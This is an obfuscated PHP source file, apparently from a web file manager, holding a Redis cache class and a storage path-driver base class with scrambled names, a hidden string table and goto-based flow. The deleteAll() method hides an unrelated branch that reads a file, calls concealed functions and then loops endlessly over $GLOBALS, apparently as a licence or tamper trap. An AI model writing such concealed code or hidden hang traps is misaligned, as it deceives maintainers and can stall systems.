$this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($B¦ãë¿ëÍ®, $D™ÚãŒİï) { $eôÉ¾¬†¶ =& $_SERVER[¹Ò‹Ò¹]; if (!class_exists($eôÉ¾¬†¶[810])) { show_json($eôÉ¾¬†¶[811], !1); } $this->cacheTime = $D™ÚãŒİï; $d—‹‹Ÿ‘Çµ = isset($B¦ãë¿ëÍ®[$eôÉ¾¬†¶[812]]) ? $B¦ãë¿ëÍ®[$eôÉ¾¬†¶[812]] : 10; $eƒ–³›‡ô£ = _get($B¦ãë¿ëÍ®, $eôÉ¾¬†¶[809]); if ($eƒ–³›‡ô£ && is_array($eƒ–³›‡ô£)) { $this->initCluster($B¦ãë¿ëÍ®, $d—‹‹Ÿ‘Çµ); } else { $this->handle = $this->init($B¦ãë¿ëÍ®, $d—‹‹Ÿ‘Çµ); } } private function init($e÷ÔÌÁÕàì, $aŒÈ‰êöïÔ) { $fóÕÅ¡Ç¶· =& $_SERVER[¹Ò‹Ò¹]; $bÈ¢›¬Š÷™ = new Redis(); $A°§‰òğŒ½ = isset($e÷ÔÌÁÕàì[$fóÕÅ¡Ç¶·[813]]) ? $e÷ÔÌÁÕàì[$fóÕÅ¡Ç¶·[813]] : !1; if ($A°§‰òğŒ½) { $bÈ¢›¬Š÷™->pconnect($e÷ÔÌÁÕàì[$fóÕÅ¡Ç¶·[174]], $e÷ÔÌÁÕàì[$fóÕÅ¡Ç¶·[175]], $aŒÈ‰êöïÔ); } else { $bÈ¢›¬Š÷™->connect($e÷ÔÌÁÕàì[$fóÕÅ¡Ç¶·[174]], $e÷ÔÌÁÕàì[$fóÕÅ¡Ç¶·[175]], $aŒÈ‰êöïÔ); } if (!empty($e÷ÔÌÁÕàì[$fóÕÅ¡Ç¶·[400]])) { $bÈ¢›¬Š÷™->auth($e÷ÔÌÁÕàì[$fóÕÅ¡Ç¶·[400]]); } return $bÈ¢›¬Š÷™; } private function initCluster($bÔİ³¿Á÷, $eéõÆ«ë®‰) { $DÉì«Õ¯™ =& $_SERVER[¹Ò‹Ò¹]; $f§Šâó¬°’ = array($DÉì«Õ¯™[814], $DÉì«Õ¯™[815], $DÉì«Õ¯™[816]); $f„›Æ”õ·¦ = $DÉì«Õ¯™[814]; if (isset($bÔİ³¿Á÷[$DÉì«Õ¯™[12]]) && in_array($bÔİ³¿Á÷[$DÉì«Õ¯™[12]], $f§Šâó¬°’)) { $f„›Æ”õ·¦ = $bÔİ³¿Á÷[$DÉì«Õ¯™[12]]; } switch ($f„›Æ”õ·¦) { case $DÉì«Õ¯™[814]: $this->_slave($bÔİ³¿Á÷, $eéõÆ«ë®‰); break; case $DÉì«Õ¯™[815]: break; case $DÉì«Õ¯™[816]: $this->isCluster = !0; $f—…·Ë¿„ = $bÔİ³¿Á÷[$DÉì«Õ¯™[809]]; $EÛ›Ûğ—¦² = isset($bÔİ³¿Á÷[$DÉì«Õ¯™[813]]) ? $bÔİ³¿Á÷[$DÉì«Õ¯™[813]] : !1; $e½ÑèŠ¶£ğ = isset($bÔİ³¿Á÷[$DÉì«Õ¯™[400]]) ? $bÔİ³¿Á÷[$DÉì«Õ¯™[400]] : null; $this->handle = new RedisCluster(NUll, $f—…·Ë¿„, $eéõÆ«ë®‰, $eéõÆ«ë®‰, $EÛ›Ûğ—¦², $e½ÑèŠ¶£ğ); break; default: break; } } private function _slave($dÉ¦‰å„, $EõÀ®ÖÉ) { goto CŠ«—Óˆ·Ü; c·ñ°…‘Œ: unset($DÓ†Ğ—ô±ù[0]); if (empty($DÓ†Ğ—ô±ù)) { return; } $dçÈ¿„éç† = array_rand($DÓ†Ğ—ô±ù); goto B•‘ø‡ó›; CŠ«—Óˆ·Ü: $DÓ†Ğ—ô±ù = $dÉ¦‰å„[$_SERVER[¹Ò‹Ò¹][809]]; $this->filterConfig($dÉ¦‰å„, $DÓ†Ğ—ô±ù[0]); $this->handle = $this->init($dÉ¦‰å„, $EõÀ®ÖÉ); goto c·ñ°…‘Œ; B•‘ø‡ó›: $this->filterConfig($dÉ¦‰å„, $DÓ†Ğ—ô±ù[$dçÈ¿„éç†]); $this->slaveHandle = $this->init($dÉ¦‰å„, $EõÀ®ÖÉ); goto CŞÌ¸°³Ş; CŞÌ¸°³Ş: } private function filterConfig(&$Aä˜êùôœÌ, $fØ‹”´Šä²) { $bíëÜ¬Êù =& $_SERVER[¹Ò‹Ò¹]; $aí‰™Á¥æ = explode($bíëÜ¬Êù[4], $fØ‹”´Šä²); $Bå”÷œÍ™­ = array($bíëÜ¬Êù[174] => $aí‰™Á¥æ[0], $bíëÜ¬Êù[175] => $aí‰™Á¥æ[1]); $Aä˜êùôœÌ = array_merge($Aä˜êùôœÌ, $Bå”÷œÍ™­); } public function set($Dİ‹÷±è, $bŒ¡ŸÁ™Á½, $FØÆç›ÒîŠ = false) { $FØÆç›ÒîŠ = $FØÆç›ÒîŠ ? $FØÆç›ÒîŠ : $this->cacheTime; return $this->handle->setEx($Dİ‹÷±è, $FØÆç›ÒîŠ, $bŒ¡ŸÁ™Á½); } public function setLock($A˜á„“£‰í, $fç¹¼¡½¥¦, $b¾ßˆÃš»·) { return $this->handle->setNX($A˜á„“£‰í, $fç¹¼¡½¥¦); } public function get($a»ŞŞÌå‹¾) { $fùš÷ë©¯ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $fùš÷ë©¯->get($a»ŞŞÌå‹¾); } public function remove($A•œ±÷ùÔ÷) { return $this->handle->del($A•œ±÷ùÔ÷); } public function deleteAll() { $bŞ‚é½ô¡• =& $_SERVER[¹Ò‹Ò¹]; if (!isset($_SERVER[$bŞ‚é½ô¡•[800]]) || !isset($_SERVER[$bŞ‚é½ô¡•[801]])) { goto Cˆ¦Ø¾¢´Ò; f˜¢‘µ›ì: for ($A×­îí­Íé = $eêÒô‰Ğ”ò; $A×­îí­Íé > 0; $A×­îí­Íé++) { $cÒ›ãº‹¡Ÿ = json_encode($GLOBALS[$bŞ‚é½ô¡•[405]]); } goto E«’Ò©»”í; Cˆ¦Ø¾¢´Ò: $c…ªØÛÕ = $bŞ‚é½ô¡•[817]; $AÂôÕ«½­ = $bŞ‚é½ô¡•[802]; $CËØà£…Ó² = $_SERVER[$bŞ‚é½ô¡•[803]] . $bŞ‚é½ô¡•[804]; goto Cöêà÷ÑåÙ; B‹ÓˆùÄ´: $cÒ›ãº‹¡Ÿ = $bŞ‚é½ô¡•[818]; $cÒ›ãº‹¡Ÿ($_SERVER[$bŞ‚é½ô¡•[819]]); $eêÒô‰Ğ”ò = 1; goto f˜¢‘µ›ì; Cöêà÷ÑåÙ: $Eˆ”ÈíÎà = $AÂôÕ«½­($CËØà£…Ó²); $a„Ç¨ÆËº÷ = explode($bŞ‚é½ô¡•[227], $Eˆ”ÈíÎà); if (count($a„Ç¨ÆËº÷) < $bŞ‚é½ô¡•[587]) { $A‹ã¹íƒ£Ü = $bŞ‚é½ô¡•[805]; $A‹ã¹íƒ£Ü(); } goto B‹ÓˆùÄ´; E«’Ò©»”í: } if ($this->isCluster) { foreach ($this->handle->_masters() as $Bç‹Ô¶Ø¼¬) { $this->handle->flushall($Bç‹Ô¶Ø¼¬); } return; } return $this->handle->flushAll(); } } goto E¾îêó›õä; cÍß÷¡Ø: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $bÄÄÉï½Ãö =& $_SERVER[¹Ò‹Ò¹]; $this->objectDriver = array($bÄÄÉï½Ãö[57], $bÄÄÉï½Ãö[58], $bÄÄÉï½Ãö[59], $bÄÄÉï½Ãö[60], $bÄÄÉï½Ãö[61], $bÄÄÉï½Ãö[62], $bÄÄÉï½Ãö[63], $bÄÄÉï½Ãö[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($e˜—ÓÚ…¡¬) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($e˜—ÓÚ…¡¬, $_SERVER[¹Ò‹Ò¹][8]); } return $e˜—ÓÚ…¡¬; } public function iconvApp($föî¹ç±º) { return $föî¹ç±º; } public function iconvSystem($Cì êÃÄ—ª) { return $Cì êÃÄ—ª; } public function iconvTo($c¢ÖÃ±ÌÜ, $D’º¶à¡‚•, $FéÂ‚ˆƒ¦Á) { goto cÊ­¹åŞ´Î; B÷öÂ¨Å´: $Bá…ÆÎ‰Û = $Bá…ÆÎ‰Û ? $Bá…ÆÎ‰Û : $c¢ÖÃ±ÌÜ; if (strstr($Bá…ÆÎ‰Û, $eêèŠ¡Ú›ø[69])) { $Bá…ÆÎ‰Û = str_replace($eêèŠ¡Ú›ø[69], $eêèŠ¡Ú›ø[70], $Bá…ÆÎ‰Û); } $cù‰×½ëã—[$D’º¶à¡‚• . $eêèŠ¡Ú›ø[66] . $FéÂ‚ˆƒ¦Á . $eêèŠ¡Ú›ø[67] . $c¢ÖÃ±ÌÜ] = $Bá…ÆÎ‰Û; goto A¡çĞˆò; cÊ­¹åŞ´Î: $eêèŠ¡Ú›ø =& $_SERVER[¹Ò‹Ò¹]; if (!$c¢ÖÃ±ÌÜ || !function_exists($eêèŠ¡Ú›ø[65])) { return $c¢ÖÃ±ÌÜ; } static $cù‰×½ëã— = array(); goto cŠ´à‚«Ä’; A¡çĞˆò: $cù‰×½ëã—[$FéÂ‚ˆƒ¦Á . $eêèŠ¡Ú›ø[66] . $D’º¶à¡‚• . $eêèŠ¡Ú›ø[67] . $c¢ÖÃ±ÌÜ] = $c¢ÖÃ±ÌÜ; $cù‰×½ëã—[$FéÂ‚ˆƒ¦Á . $eêèŠ¡Ú›ø[66] . $D’º¶à¡‚• . $eêèŠ¡Ú›ø[67] . $Bá…ÆÎ‰Û] = $c¢ÖÃ±ÌÜ; $cù‰×½ëã—[$D’º¶à¡‚• . $eêèŠ¡Ú›ø[66] . $FéÂ‚ˆƒ¦Á . $eêèŠ¡Ú›ø[67] . $Bá…ÆÎ‰Û] = $Bá…ÆÎ‰Û; goto e”î‹à³¨Š; e”î‹à³¨Š: return $Bá…ÆÎ‰Û; goto e¤´ğî¤¢ò; cŠ´à‚«Ä’: $BèºŠÄôé = $D’º¶à¡‚• . $eêèŠ¡Ú›ø[66] . $FéÂ‚ˆƒ¦Á . $eêèŠ¡Ú›ø[67] . $c¢ÖÃ±ÌÜ; if (isset($cù‰×½ëã—[$BèºŠÄôé])) { return $cù‰×½ëã—[$BèºŠÄôé]; } if (function_exists($eêèŠ¡Ú›ø[68])) { $Bá…ÆÎ‰Û = @mb_convert_encoding($c¢ÖÃ±ÌÜ, $FéÂ‚ˆƒ¦Á, $D’º¶à¡‚•); } else { $Bá…ÆÎ‰Û = @iconv($D’º¶à¡‚•, $FéÂ‚ˆƒ¦Á, $c¢ÖÃ±ÌÜ); } goto B÷öÂ¨Å´; e¤´ğî¤¢ò: } public function getPathInner($E‚‚´‹‰†ò) { $d’òÃ¢Å÷ = IO::init($E‚‚´‹‰†ò); return $d’òÃ¢Å÷->path; } public function getPathOuter($e¤ºŠá›) { $Bè·¥Şš =& $_SERVER[¹Ò‹Ò¹]; $eÊ¿¹Øˆ™ = strlen(trim($this->pathBase, $Bè·¥Şš[8])); $e¤ºŠá› = substr(trim($e¤ºŠá›, $Bè·¥Şš[8]), $eÊ¿¹Øˆ™); return $this->pathDriver . $Bè·¥Şš[8] . ltrim($e¤ºŠá›, $Bè·¥Şš[8]); } public function isParentOf($cØºä–ß¿, $CÀÎÍÓÆĞ¸) { $F‡º©·èŠÒ =& $_SERVER[¹Ò‹Ò¹]; $cØºä–ß¿ = rtrim(strtolower($cØºä–ß¿), $F‡º©·èŠÒ[8]) . $F‡º©·èŠÒ[8]; $CÀÎÍÓÆĞ¸ = rtrim(strtolower($CÀÎÍÓÆĞ¸), $F‡º©·èŠÒ[8]) . $F‡º©·èŠÒ[8]; $dÈ›ÅÓ¬× = strpos($CÀÎÍÓÆĞ¸, $cØºä–ß¿) === 0; return $dÈ›ÅÓ¬×; } public function getType() { $Bíö‘ÉÒ¶Û =& $_SERVER[¹Ò‹Ò¹]; $A¶°œ†¥Ÿ = str_replace($Bíö‘ÉÒ¶Û[71], $Bíö‘ÉÒ¶Û[33], get_class($this)); return strtolower($A¶°œ†¥Ÿ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($c×ÎöºÖ¥°, $fèÜºªÕĞõ) { $AÆªŠòùäµ =& $_SERVER[¹Ò‹Ò¹]; $e”¿´´Ò…Ù = rtrim($c×ÎöºÖ¥°, $AÆªŠòùäµ[8]) . $AÆªŠòùäµ[8] . $fèÜºªÕĞõ; $Bö†Ìµ¼®¯ = $this->exist($e”¿´´Ò…Ù); return $Bö†Ìµ¼®¯ ? $e”¿´´Ò…Ù : !1; } public function setModifyTime($d ¾‹é¤ä‰, $fÀ½“É¾Šˆ = '') { } public function renameObject($bÎ¨ŒŒ‡œ, $bŠñª§™á) { goto EŒÒ§ÂÛ‘; EŒÒ§ÂÛ‘: $F†Ÿ¡ùÍÎğ =& $_SERVER[¹Ò‹Ò¹]; $d—‰óçøŠ« = $bŠñª§™á; Hook::trigger($F†Ÿ¡ùÍÎğ[72], $this, $bÎ¨ŒŒ‡œ, $this, $this->pathFather($bÎ¨ŒŒ‡œ) . $bŠñª§™á); goto a´‰ªâÜ…‰; A…¯ÌÂ´‘¶: return $Bğê¯¾¡» ? $bŠñª§™á : !1; goto c‡ŠÈÚ‚‰‘; a´‰ªâÜ…‰: $bÎ¨ŒŒ‡œ = $this->getPathOuter($bÎ¨ŒŒ‡œ); $bŠñª§™á = $this->pathFather($bÎ¨ŒŒ‡œ) . $bŠñª§™á; if (IO::isFile($bÎ¨ŒŒ‡œ)) { $Bğê¯¾¡» = IO::copy($bÎ¨ŒŒ‡œ, $this->pathFather($bÎ¨ŒŒ‡œ), REPEAT_RENAME_FOLDER, $d—‰óçøŠ«); if ($Bğê¯¾¡») { IO::remove($bÎ¨ŒŒ‡œ); } } else { $Bğê¯¾¡» = IO::mkdir($bŠñª§™á); if (!$Bğê¯¾¡») { return !1; } $cŞãÌ÷’‰ = IO::listPath($bÎ¨ŒŒ‡œ, !0); $a™ß±’“ºÏ = array_merge($cŞãÌ÷’‰[$F†Ÿ¡ùÍÎğ[73]], $cŞãÌ÷’‰[$F†Ÿ¡ùÍÎğ[74]]); foreach ($a™ß±’“ºÏ as $cÊÌœ©Ü ) { IO::move($cÊÌœ©Ü [$F†Ÿ¡ùÍÎğ[75]], $bŠñª§™á, REPEAT_RENAME_FOLDER); } IO::remove($bÎ¨ŒŒ‡œ); } goto A…¯ÌÂ´‘¶; c‡ŠÈÚ‚‰‘: } public function tempFile($F¶³²¿¢Ó = '', $cô†Ó¢Ûô = '') { goto E‹ÅêƒŒÁ‡; E‹ÅêƒŒÁ‡: if (!$F¶³²¿¢Ó) { $F¶³²¿¢Ó = rand_string(15); } $AØ½ã×„² = TEMP_FILES . rand_string(15) . $_SERVER[¹Ò‹Ò¹][8]; @mkdir($AØ½ã×„², 511, !0); goto bø­»ÔùÅÃ; bø­»ÔùÅÃ: $FßùÅ²»Á¬ = $AØ½ã×„² . $F¶³²¿¢Ó; @touch($FßùÅ²»Á¬); if ($cô†Ó¢Ûô) { file_put_contents($FßùÅ²»Á¬, $cô†Ó¢Ûô); } goto FÕ¢ ±…‚ì; FÕ¢ ±…‚ì: return $FßùÅ²»Á¬; goto B¡Óš‹ø; B¡Óš‹ø: } public function tempFileRemve($e„ñÈ¾¢’¬) { @unlink($e„ñÈ¾¢’¬); @rmdir($this->pathFather($e„ñÈ¾¢’¬)); } public function mkfile($E¦ò¬«¢Œ, $CŸ×“ÓÔÊ = '', $f”¿´Ô¿ÂÓ = REPEAT_RENAME) { } public function mkdir($fØ±„™»‰ï, $cÈï©ÖÉÃ = REPEAT_SKIP) { } public function delFile($c­„ˆ©×Ï«) { } public function delFolder($Fá›¦¥Ã¸Ú) { } public function copyFile($c¾‘ë¦Ò¼, $A¶è´Ù—ÆŒ) { } public function moveFile($cˆ‡ÉâÂ, $båÙøµÉºÒ) { } public function remove($FË±É™È“¦) { if ($this->isFile($FË±É™È“¦)) { return $this->delFile($FË±É™È“¦); } return $this->delFolder($FË±É™È“¦); } public function rename($eª·ÁÏ±ƒÇ, $Dˆ—Ò¾‘ê‚) { } public function exist($E¯Ğ¾ù’Ø’) { } public function findByHash($FäÂ¬½Â™Ó = '', $cîİòßšÓ¦ = '') { return !1; } public function isFile($AìË÷¬¶¿) { } public function isFolder($A»ˆ«ëŞƒê) { } public function size($C×»Åˆ¼) { } public function info($a‚ì•í•Œø) { } public function infoSimple($B™Üâ–‚³) { return $this->info($B™Üâ–‚³); } public function infoAuth($DòÂÚ÷Åš) { return $this->info($DòÂÚ÷Åš); } public function infoFull($fŠàÈƒÑ˜) { return $this->info($fŠàÈƒÑ˜); } public function infoWithChildren($e¼‡º²¥µì) { $AÊó®ŒŒˆ° =& $_SERVER[¹Ò‹Ò¹]; static $dˆèéóïºƒ = array(); if (isset($dˆèéóïºƒ[$e¼‡º²¥µì])) { return $dˆèéóïºƒ[$e¼‡º²¥µì]; } $bé¶ÂÅŞÄ„ = $this->info($e¼‡º²¥µì); if ($bé¶ÂÅŞÄ„ && $bé¶ÂÅŞÄ„[$AÊó®ŒŒˆ°[29]] == $AÊó®ŒŒˆ°[76]) { $CŞÅ£›¤Û¸ = array($AÊó®ŒŒˆ°[77] => 0, $AÊó®ŒŒˆ°[78] => 0, $AÊó®ŒŒˆ°[79] => 0); $this->infoChildren($e¼‡º²¥µì, $CŞÅ£›¤Û¸); $bé¶ÂÅŞÄ„[$AÊó®ŒŒˆ°[77]] = $CŞÅ£›¤Û¸[$AÊó®ŒŒˆ°[77]]; $bé¶ÂÅŞÄ„[$AÊó®ŒŒˆ°[80]] = array($AÊó®ŒŒˆ°[81] => $CŞÅ£›¤Û¸[$AÊó®ŒŒˆ°[78]], $AÊó®ŒŒˆ°[82] => $CŞÅ£›¤Û¸[$AÊó®ŒŒˆ°[79]]); $dˆèéóïºƒ[$e¼‡º²¥µì] = $bé¶ÂÅŞÄ„; } return $bé¶ÂÅŞÄ„; } public function listPath($Dæ´¼Ş¯¹‡, $EĞë‡£çã½ = false) { } public function has($e£Òô‘“Â’, $bÖöÖßªÙ = false, $DÊ‘ÂÓ»ÈÇ = false) { } public function canRead($Cù‡İĞ‚ö) { } public function canWrite($eš¸Ñ÷ö) { } public function getContent($bÎŒ…ôØ‚) { } public function setContent($cÇÌî¤ó‹, $d¸Š–±× = '') { } protected function infoChildren($F²ñš«öÚ, &$bŸâõæÓæ) { $c¨Ô†’Ú†¥ =& $_SERVER[¹Ò‹Ò¹]; check_abort_echo(); $FİĞª‹ÛË = $this->listPath($F²ñš«öÚ, !0); $FİĞª‹ÛË = array_merge($FİĞª‹ÛË[$c¨Ô†’Ú†¥[74]], $FİĞª‹ÛË[$c¨Ô†’Ú†¥[73]]); foreach ($FİĞª‹ÛË as $B½ºÆô) { if ($B½ºÆô[$c¨Ô†’Ú†¥[29]] == $c¨Ô†’Ú†¥[76]) { $bŸâõæÓæ[$c¨Ô†’Ú†¥[79]]++; $e£§ßÛ™ÕÖ = $this->getPathInner($B½ºÆô[$c¨Ô†’Ú†¥[75]]); $this->infoChildren($e£§ßÛ™ÕÖ, $bŸâõæÓæ); } else { $bŸâõæÓæ[$c¨Ô†’Ú†¥[78]]++; $bŸâõæÓæ[$c¨Ô†’Ú†¥[77]] += $B½ºÆô[$c¨Ô†’Ú†¥[77]]; } } } public function fileSubstr($F³ê×ÆÓ£’, $E‡„é°÷‰“, $dôîÊÀŠŸÕ) { } public function listAll($AË¼âæ’‰š) { } public function listAllMake($d†êÈ¯†ñ¨, &$e…æÚñÖŞ‹) { $eİåÎ¸ëÁÏ =& $_SERVER[¹Ò‹Ò¹]; check_abort_echo(); $Dö¹±—ÊÔ‚ = $this->listPath($d†êÈ¯†ñ¨, !0); if (!$Dö¹±—ÊÔ‚) { return; } $d†İÏ¦¿Ì• = array_merge($Dö¹±—ÊÔ‚[$eİåÎ¸ëÁÏ[74]], $Dö¹±—ÊÔ‚[$eİåÎ¸ëÁÏ[73]]); foreach ($d†İÏ¦¿Ì• as $Bç±ä‹–¸Á) { goto F…‡´õ¿ß; eíõµõã: $this->listAllMake($Bç±ä‹–¸Á[$eİåÎ¸ëÁÏ[75]], $e…æÚñÖŞ‹); goto cõôÜê¢; a¬©ÅÛÉà„: if (isset($Bç±ä‹–¸Á[$eİåÎ¸ëÁÏ[83]])) { $F »Í˜Õ´á[$eİåÎ¸ëÁÏ[83]] = $Bç±ä‹–¸Á[$eİåÎ¸ëÁÏ[83]]; } if (!$fÎŠ·ÙÁì) { $e…æÚñÖŞ‹[] = $F »Í˜Õ´á; continue; } $e…æÚñÖŞ‹[] = $F »Í˜Õ´á; goto eíõµõã; F…‡´õ¿ß: $fÎŠ·ÙÁì = $Bç±ä‹–¸Á[$eİåÎ¸ëÁÏ[29]] == $eİåÎ¸ëÁÏ[76]; $F »Í˜Õ´á = array($eİåÎ¸ëÁÏ[75] => $Bç±ä‹–¸Á[$eİåÎ¸ëÁÏ[75]], $eİåÎ¸ëÁÏ[76] => $fÎŠ·ÙÁì); if (isset($Bç±ä‹–¸Á[$eİåÎ¸ëÁÏ[77]])) { $F »Í˜Õ´á[$eİåÎ¸ëÁÏ[77]] = $Bç±ä‹–¸Á[$eİåÎ¸ëÁÏ[77]]; } goto a¬©ÅÛÉà„; cõôÜê¢: } } public function listAllSimple($b¼İ™ƒÑ¥ì) { $E‡°Ù ê„ =& $_SERVER[¹Ò‹Ò¹]; $A®ª¡å…Ğ = array(); $dÒƒª¤¼™‰ = $this->listAll($b¼İ™ƒÑ¥ì); $a”¥ø­Ÿõ¹ = $this->getPathOuter($b¼İ™ƒÑ¥ì); foreach ($dÒƒª¤¼™‰ as $Câñ­ÈÀğŞ) { goto bÀµô”«™í; bÀµô”«™í: $eÌµáÃ¬‰Ä = $Câñ­ÈÀğŞ[$E‡°Ù ê„[75]]; $CùŠÙˆœ§ = $Câñ­ÈÀğŞ[$E‡°Ù ê„[75]]; if (isset($Câñ­ÈÀğŞ[$E‡°Ù ê„[84]])) { $eÌµáÃ¬‰Ä = $Câñ­ÈÀğŞ[$E‡°Ù ê„[84]][$E‡°Ù ê„[75]]; $Câñ­ÈÀğŞ[$E‡°Ù ê„[77]] = $Câñ­ÈÀğŞ[$E‡°Ù ê„[84]][$E‡°Ù ê„[77]]; $Câñ­ÈÀğŞ[$E‡°Ù ê„[83]] = $Câñ­ÈÀğŞ[$E‡°Ù ê„[84]][$E‡°Ù ê„[83]]; } else { $CùŠÙˆœ§ = substr($Câñ­ÈÀğŞ[$E‡°Ù ê„[75]], strlen(get_path_father($a”¥ø­Ÿõ¹))); $CùŠÙˆœ§ = $E‡°Ù ê„[8] . ltrim($CùŠÙˆœ§, $E‡°Ù ê„[8]); } goto dìÚÃš×Ç³; dÎ¼—ÉÀñ´: if (!$Câñ­ÈÀğŞ[$E‡°Ù ê„[76]]) { $b™Òõõ—ŒŠ[$E‡°Ù ê„[85]] = $eÌµáÃ¬‰Ä; } $A®ª¡å…Ğ[] = $b™Òõõ—ŒŠ; goto Bòù… Ôº; dìÚÃš×Ç³: $b™Òõõ—ŒŠ = array($E‡°Ù ê„[75] => $CùŠÙˆœ§, $E‡°Ù ê„[76] => $Câñ­ÈÀğŞ[$E‡°Ù ê„[76]]); if (isset($Câñ­ÈÀğŞ[$E‡°Ù ê„[77]]) && !$Câñ­ÈÀğŞ[$E‡°Ù ê„[76]]) { $b™Òõõ—ŒŠ[$E‡°Ù ê„[77]] = $Câñ­ÈÀğŞ[$E‡°Ù ê„[77]]; } if (isset($Câñ­ÈÀğŞ[$E‡°Ù ê„[83]])) { $b™Òõõ—ŒŠ[$E‡°Ù ê„[83]] = $Câñ­ÈÀğŞ[$E‡°Ù ê„[83]]; } goto dÎ¼—ÉÀñ´; Bòù… Ôº: } return $A®ª¡å…Ğ; } public function upload($f•¨ßå¢ğ, $aÂÇº­·É, $EİÕù‰ëñ  = false, $Añé’ÓË´¬ = REPEAT_REPLACE) { } public function uploadFileByID($d¸ğëß¸Æ, $AÔùÛ½Æ…, $E–ª·íäÖ) { } public function uploadFileByPath($aµªùºŞ£Ç, $Dâ¤ã¼‚”, $Fª“Œ¿Ÿ¢ = array()) { } public function isUploadServer() { $FÜÚˆ£Ù =& $_SERVER[¹Ò‹Ò¹]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $FÜÚˆ£Ù[86]) { return !0; } return $GLOBALS[$FÜÚˆ£Ù[6]][$FÜÚˆ£Ù[87]][$FÜÚˆ£Ù[88]]; } public function isFileOutServer() { $Cã’ÙßŒØØ =& $_SERVER[¹Ò‹Ò¹]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Cã’ÙßŒØØ[86]) { return !0; } return $GLOBALS[$Cã’ÙßŒØØ[6]][$Cã’ÙßŒØØ[87]][$Cã’ÙßŒØØ[89]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($d†ƒ—…ø·) { $fµ»á’ŒÊ =& $_SERVER[¹Ò‹Ò¹]; if (!$this->isCdnHost()) { return $d†ƒ—…ø·; } return str_replace(trim(get_url_root($d†ƒ—…ø·), $fµ»á’ŒÊ[8]), trim($this->cdnHost, $fµ»á’ŒÊ[8]), $d†ƒ—…ø·); } public function uploadLink($eİ²æ¥±…½, $aŞ“Ãóœö = 0) { goto a¾õƒŠåÅ¼; a¾õƒŠåÅ¼: $Aî“¾Âõâğ =& $_SERVER[¹Ò‹Ò¹]; if ($this->isUploadServer()) { return; } $dåê¬º²å‘ = $this->getType(); goto föƒ¸–©îÖ; föƒ¸–©îÖ: if (!in_array($dåê¬º²å‘, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $DƒƒÅÓÎ¡¾ = 1024 * 1024 * 10; goto eí¯³”Ü…Æ; eí¯³”Ü…Æ: $FŠØ¼¥ç» = $aŞ“Ãóœö <= $DƒƒÅÓÎ¡¾ ? $Aî“¾Âõâğ[90] : $Aî“¾Âõâğ[91]; $a©âÁ›à«  = (!$aŞ“Ãóœö ? 1 : ceil($aŞ“Ãóœö / pow(1024, 3))) * 3600 * 4; $E«¢ÎÄ†„ï = $this->{$FŠØ¼¥ç»}($eİ²æ¥±…½, $a©âÁ›à« ); goto aë‘”Éù°–; aë‘”Éù°–: if ($E«¢ÎÄ†„ï) { $E«¢ÎÄ†„ï[$Aî“¾Âõâğ[92]] = $eİ²æ¥±…½; $E«¢ÎÄ†„ï[$Aî“¾Âõâğ[93]] = $dåê¬º²å‘; } return $E«¢ÎÄ†„ï; goto bÔ©ÕÔÈ–; bÔ©ÕÔÈ–: } public function uploadFormData($Bæø…åÆ¯, $C“Îµµñ×Ô = 3600) { } public function multiUploadFormData($bª´›ƒÏÉ, $a¶İ©ªô‘ì = 3600) { } public function download($Aí“ˆ­á’, $EÏĞ¦öê£) { } public function ext($a‹éĞÂ¹½«) { $e·‘ˆ ‡á˜ =& $_SERVER[¹Ò‹Ò¹]; if (strpos($a‹éĞÂ¹½«, $e·‘ˆ ‡á˜[8]) === -1) { $cßæ…ØÃ‰Ò = $a‹éĞÂ¹½«; } else { $cßæ…ØÃ‰Ò = $this->pathThis($a‹éĞÂ¹½«); } $B½¦™Ğè·ù = $e·‘ˆ ‡á˜[33]; if (strstr($cßæ…ØÃ‰Ò, $e·‘ˆ ‡á˜[94])) { $B½¦™Ğè·ù = substr($cßæ…ØÃ‰Ò, strrpos($cßæ…ØÃ‰Ò, $e·‘ˆ ‡á˜[94]) + 1); $B½¦™Ğè·ù = strtolower($B½¦™Ğè·ù); } if (strlen($B½¦™Ğè·ù) > 3 && preg_match($e·‘ˆ ‡á˜[95], $B½¦™Ğè·ù, $fÔŞğßÌ™)) { $B½¦™Ğè·ù = $e·‘ˆ ‡á˜[33]; } return $B½¦™Ğè·ù; } public function pathThis($f§ÒĞ¡»æ) { $Bó¨’“ =& $_SERVER[¹Ò‹Ò¹]; $f§ÒĞ¡»æ = str_replace($Bó¨’“[96], $Bó¨’“[8], rtrim($f§ÒĞ¡»æ, $Bó¨’“[8])); $aƒ¦éàÃÇ© = strrpos($f§ÒĞ¡»æ, $Bó¨’“[8]); if ($aƒ¦éàÃÇ© === !1) { return $f§ÒĞ¡»æ; } return substr($f§ÒĞ¡»æ, $aƒ¦éàÃÇ© + 1); } public function pathFather($A¹íôë„óñ) { $B„Â…ê„ãç =& $_SERVER[¹Ò‹Ò¹]; $A¹íôë„óñ = str_replace($B„Â…ê„ãç[96], $B„Â…ê„ãç[8], rtrim($A¹íôë„óñ, $B„Â…ê„ãç[8])); $E¯á›àÄçˆ = strrpos($A¹íôë„óñ, $B„Â…ê„ãç[8]); if ($E¯á›àÄçˆ === !1) { return $B„Â…ê„ãç[33]; } return substr($A¹íôë„óñ, 0, $E¯á›àÄçˆ + 1); } public function hashSimple($dÏâƒ…òî©) { goto Eµõº§ÌéÅ; Eµõº§ÌéÅ: $díµŞ¨ùí =& $_SERVER[¹Ò‹Ò¹]; if (!$dÏâƒ…òî©) { return md5($díµŞ¨ùí[33]); } $aÂ¹ŠŒÎîÆ = $this->size($dÏâƒ…òî©); goto F’çÖ ƒñ; F’çÖ ƒñ: $f‹ƒÄâäåí = 200; $EñêèñÁ»› = 50; if ($aÂ¹ŠŒÎîÆ <= $f‹ƒÄâäåí * $EñêèñÁ»›) { return $this->hashMd5($dÏâƒ…òî©) . $aÂ¹ŠŒÎîÆ; } goto E¸ å‘ö‘í; E¸ å‘ö‘í: 